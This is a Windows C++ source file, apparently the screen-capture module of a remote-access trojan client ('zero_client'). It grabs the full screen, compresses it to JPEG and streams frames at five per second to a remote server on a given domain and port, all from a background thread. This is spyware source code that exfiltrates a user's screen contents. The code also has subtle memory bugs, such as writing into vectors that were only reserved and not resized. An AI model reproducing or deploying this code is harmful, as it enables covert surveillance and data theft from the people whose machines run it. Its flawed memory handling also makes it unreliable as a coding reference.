#include "screenspy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
// 初始化类
static ScreenSpy gSpy;

ScreenSpy::ScreenSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);
}

ScreenSpy::~ScreenSpy()
{
    // 删除互挤体
    DeleteCriticalSection(&gCs);
}

bool ScreenSpy::captureScreen(std::vector<unsigned char> &bmpData)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    HBITMAP hBitmap;

    // 得到屏幕设备
    //HDC hScrDC = CreateDCA(_T("DISPLAY"),NULL,NULL,NULL);
    HDC hScrDC = CreateDCA(("DISPLAY"),NULL,NULL,NULL);
    if(!hScrDC) {
        std::cout << "Failed to get screen device" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 创建新的设备
    HDC hRamDC = CreateCompatibleDC(hScrDC);
    if(!hRamDC) {
        std::cout << "Failed to create device" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 设置图片大小
    unsigned int iByte = 3;
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
    unsigned int iBmpSize = iWidth * iHeigth * iByte;
    if(iWidth == 1366) {
        iWidth = 1360;
    }

    // 创建位图
    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPINFO bmpInfo;
    void *p;

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfoHeader.biBitCount = 32;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biWidth = iWidth;
    bmpInfoHeader.biHeight = iHeigth;
    bmpInfo.bmiHeader = bmpInfoHeader;

    // 获取位图
    hBitmap = CreateDIBSection(hScrDC,&bmpInfo,DIB_RGB_COLORS,&p,NULL,0);
    if(!hBitmap) {
        std::cout << "Failed to CreateDIBSection" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 绑定设备与对象
    HBITMAP hBitmapOld;
    hBitmapOld = (HBITMAP)SelectObject(hRamDC,hBitmap);

    // 把屏幕复制到新申请的设备上
    StretchBlt(hRamDC,0,0,iWidth,iHeigth,hScrDC,0,0,iWidth,iHeigth,SRCCOPY);

    // 复制图片到内存空间
    bmpData.reserve(iBmpSize);
    HDC hTmpDC = GetDC(NULL);
    hBitmap = (HBITMAP)SelectObject(hRamDC,hBitmapOld);

    bmpInfoHeader.biBitCount = 24;
    int iError = GetDIBits(hTmpDC,hBitmap,0,iHeigth,bmpData.data(),(BITMAPINFO *)&bmpInfoHeader,DIB_RGB_COLORS);
    if(!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 释放设备与对象
    DeleteDC(hScrDC);
    DeleteDC(hRamDC);
    DeleteObject(hBitmapOld);
    DeleteDC(hTmpDC);
    DeleteObject(hBitmap);

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
    return true;
}

unsigned int  ScreenSpy::convertToJpgData(const std::vector<unsigned char> &bmpData,
                                 std::vector<unsigned char> &jpgData)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    // 设置图片大小
    unsigned int iByte = 3;
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeigth = GetSystemMetrics(SM_CYSCREEN);
    unsigned int iBmpSize = iWidth * iHeigth * iByte;
    if(iWidth == 1366) {
        iWidth = 1360;
    }

    //  由於bitmap和jpg的儲存方式是相反,所以要把他反過來
    //  例如: rgb: 1 2 3  ->  9 8 7
    //            4 5 6  ->  6 5 4
    //            7 8 9  ->  3 2 1
    const unsigned char *bmp = bmpData.data();
    std::vector<unsigned char> convertedBmp;
    convertedBmp.reserve(iBmpSize);
    unsigned char *cBmp = (unsigned char*)convertedBmp.data();

    for(unsigned int i = 0,j;i < iHeigth;i ++) {
        for(j = 0;j < iWidth;j ++) {
            cBmp[i * iWidth *  iByte + j * 3] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 2];
            cBmp[i * iWidth *  iByte + j * 3 + 1] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte + 1];
            cBmp[i * iWidth *  iByte + j * 3 + 2] = bmp[(iHeigth - i - 1) * iWidth * iByte + j * iByte];
        }
    }

    // 设置jpg结构
    struct jpeg_compress_struct jcs;
    struct jpeg_error_mgr jem;

    jcs.err = jpeg_std_error(&jem);
    jpeg_create_compress(&jcs);

    // 设置输出配置
    jcs.image_height = iHeigth;
    jcs.image_width = iWidth;
    jcs.input_components = iByte;
    jcs.in_color_space = JCS_RGB;

    jpeg_set_defaults(&jcs);

    // 设置压缩质量
    const int quality = 30;     // 越大越好，越小越差，你可以自己设置
    jpeg_set_quality(&jcs, quality, TRUE);

    // 设置输出文件（临时文件来的，名字随便设置）
    const std::string fileName= "zero_client_screen_capture.tmp";
    FILE *fp = fopen(fileName.data(),"wb+");
    if (!fp) {
        std::cout << "Failed to create file " << fileName << " error:"
                  << ferror(fp) <<std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return 0;
    }

    jpeg_stdio_dest(&jcs,fp);

    // 开始压缩
    jpeg_start_compress(&jcs,TRUE);
    JSAMPROW jr;
    while(jcs.next_scanline < iHeigth) {
        jr = &cBmp[jcs.next_scanline * iWidth * iByte];
        jpeg_write_scanlines(&jcs,&jr,1);
    }

    // 释放
    jpeg_finish_compress(&jcs);
    jpeg_destroy_compress(&jcs);
    fclose(fp);

    // 读取压缩好的数据
    FILE *fpIn = fopen(fileName.data(),"rb+");
    if(!fpIn) {
        std::cout << "Failed to read file " << fileName << " error:"
                  << ferror(fp) <<std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return 0;
    }

    // 获取jpg文件大小
    fseek(fpIn,0,SEEK_END);
    size_t iLen = ftell(fpIn);
    rewind(fpIn);

    // 读取
    jpgData.reserve(iLen);
    fread((unsigned char*)jpgData.data() , 1 , iLen ,fpIn);

    // 释放
    fclose(fpIn);

    // 删除临时文件
    DeleteFileA(fileName.data());

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
    return iLen;
}

void ScreenSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0,ScreenSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD WINAPI ScreenSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));
    startScreenSpy(domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void ScreenSpy::startScreenSpy(std::string domain, int port)
{
    // 创建socket并连接至服务端
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect screen spy server " <<
                     domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started screen spy" << std::endl;
    std::fflush(stdout);

    // 开始传送数据
    const int fps = 5;  // 每秒帧度，你能自己设置
    do {
        Sleep(1000/fps);

        // 截取屏幕，再把它转换成jpg格式
        std::vector<unsigned char> bmp, jpg;

        if (!captureScreen(bmp)) {
            sock.dissconnect();
            break;
        }

        unsigned int len = 0;
        if ((len = convertToJpgData(bmp, jpg)) == 0) {
            sock.dissconnect();
            break;
        }

        // 发送数据
        if (!sendScreenData(&sock, jpg, len)) {
            break;
        }
    } while (1);

    // 完成
    std::cout << "Finished screen spy" << std::endl;
    std::fflush(stdout);
}

bool ScreenSpy::sendScreenData(TcpSocket *sock, std::vector<unsigned char> &jpg,unsigned int len)
{
    // 发送头包
    ScreenSpyHeader header;
    header.len = len;
    if (!sock->sendData((char*)&header, sizeof(ScreenSpyHeader))) {
        return false;
    }

    // 发送jpg数据包，包大小每次最好少于1000，我这里定义800
    const unsigned int paketLen = 800;
    char *data = (char *)jpg.data();
    unsigned int pos = 0;

    while (pos < len) {
        int sendSize = (pos+paketLen) > len ? len-pos : paketLen;

        if (!sock->sendData(data+pos, sendSize)) {
            return false;
        }

        pos += sendSize;
    }

    return true;
}

